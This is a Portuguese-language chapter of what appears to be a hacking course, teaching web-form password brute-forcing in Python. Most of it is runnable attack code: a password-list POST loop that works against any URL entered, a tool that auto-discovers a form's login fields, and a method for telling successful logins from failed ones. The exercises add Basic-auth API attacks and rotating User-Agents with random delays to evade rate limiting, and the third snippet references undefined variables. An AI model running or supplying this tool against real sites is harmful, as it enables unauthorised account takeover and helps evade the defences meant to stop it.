# Capítulo 16 — Força Bruta Web

**Objetivos deste capítulo:**
- Entender como funciona autenticação web
- Construir um brute force em formulários HTTP
- Lidar com rate limiting e CAPTCHA
- Gerar relatório de credenciais encontradas

---

## Autenticação web

Sites usam formulários HTML para login. Os dados (usuário + senha) são enviados via POST para o servidor. Um ataque de força bruta web automatiza esse envio para testar milhares de combinações.

---

## Brute force em formulário POST

```python
#!/usr/bin/env python3
"""
Força bruta em formulário web.
Uso: python3 web_brute.py
"""

import requests
import sys
import time

def tentar_login(url, usuario, senha, campo_user="username",
                  campo_pass="password", campo_submit="submit",
                  indicador_sucesso="Bem-vindo"):
    """
    Tenta login com uma credencial.
    Retorna True se o login foi bem-sucedido.
    """
    dados = {
        campo_user: usuario,
        campo_pass: senha,
        campo_submit: "Login"
    }

    try:
        resposta = requests.post(url, data=dados, timeout=5)

        # Verifica se encontrou indicador de sucesso
        if indicador_sucesso in resposta.text:
            return True
        return False

    except requests.exceptions.Timeout:
        print("  [!] Timeout")
        return None
    except requests.exceptions.ConnectionError:
        print("  [!] Erro de conexão")
        return None

def brute_force_web(url, usuario, lista_senhas, delay=1):
    """Tenta várias senhas contra um formulário web."""
    print(f"Força bruta web em: {url}")
    print(f"Usuário: {usuario}")
    print(f"Senhas: {len(lista_senhas)}")
    print("-" * 50)

    for i, senha in enumerate(lista_senhas, 1):
        resultado = tentar_login(url, usuario, senha)

        if resultado is True:
            print(f"\n✓ SENHA ENCONTRADA!")
            print(f"  Usuário: {usuario}")
            print(f"  Senha:   {senha}")
            return senha
        elif resultado is None:
            print(f"  [!] Erro — provável bloqueio.")
            break

        if i % 10 == 0:
            print(f"  Progresso: {i}/{len(lista_senhas)}")

        time.sleep(delay)

    print("\nSenha não encontrada.")
    return None

if __name__ == "__main__":
    url = input("URL do formulário de login: ")
    usuario = input("Usuário: ")
    arquivo = input("Arquivo de senhas: ")

    with open(arquivo) as f:
        senhas = [l.strip() for l in f if l.strip()]

    brute_force_web(url, usuario, senhas)
```

---

## Passo 2 — Identificando campos do formulário

Sites diferentes têm nomes de campos diferentes. Vamos criar uma função que descobre os campos automaticamente:

```python
from bs4 import BeautifulSoup

def descobrir_campos(url):
    """Descobre os campos de input de um formulário."""
    try:
        resp = requests.get(url, timeout=5)
        soup = BeautifulSoup(resp.text, 'html.parser')
        formularios = soup.find_all('form')

        for f in formularios:
            action = f.get('action', url)
            inputs = f.find_all('input')
            campos = [i.get('name') for i in inputs if i.get('type') != 'submit']
            print(f"Formulário encontrado: action={action}")
            print(f"Campos: {campos}")

            # Sugestão com base no nome dos campos
            sugestoes = []
            for c in campos:
                c_low = c.lower()
                if 'user' in c_low or 'login' in c_low or 'email' in c_low:
                    sugestoes.append(('user', c))
                elif 'pass' in c_low or 'senha' in c_low or 'pwd' in c_low:
                    sugestoes.append(('pass', c))

            if sugestoes:
                print(f"Sugestão de configuração:")
                for tipo, campo in sugestoes:
                    print(f"  {tipo} → '{campo}'")

            return action, campos

    except Exception as e:
        print(f"Erro ao acessar {url}: {e}")
        return None, []
```

---

## Passo 3 — Detectando sucesso sem indicador fixo

Às vezes você não sabe qual texto indica sucesso. Compare a resposta:

```python
def detectar_sucesso(url, usuario, senha_certa, senha_errada):
    """Ajuda a identificar como detectar login bem-sucedido."""
    dados_erro = {campo_user: usuario, campo_pass: senha_errada}
    dados_certo = {campo_user: usuario, campo_pass: senha_certa}

    r_erro = requests.post(url, data=dados_erro)
    r_certo = requests.post(url, data=dados_certo)

    # Diferenças entre as respostas
    if len(r_erro.text) != len(r_certo.text):
        print("✓ Sucesso detectável por tamanho da resposta")
    if r_erro.status_code != r_certo.status_code:
        print(f"✓ Código HTTP muda ({r_erro.status_code} → {r_certo.status_code})")
    if "senha" in r_erro.text.lower() and "senha" not in r_certo.text.lower():
        print("✓ Texto de erro some no sucesso")
```

---

## Exercícios

### Exercício 1 — Teste contra DVWA

Baixe a DVWA (Damn Vulnerable Web Application) e teste o brute force contra o formulário de login.

### Exercício 2 — Brute force em API REST

Adapte o código para testar uma API REST que usa autenticação Basic:

```bash
Authorization: Basic base64(usuario:senha)
```

### Exercício 3 — Evasão de rate limit

Adicione rotação de User-Agent e delays aleatórios para evitar detecção.

---

## Resumo

- Formulários web enviam credenciais via POST
- **BeautifulSoup** extrai campos de formulários automaticamente
- Compare respostas de erro e sucesso para detectar login válido
- **Rate limiting** e CAPTCHA são defesas comuns contra brute force web

No próximo capítulo, construímos um **dashboard de hardening** para verificar a segurança do sistema.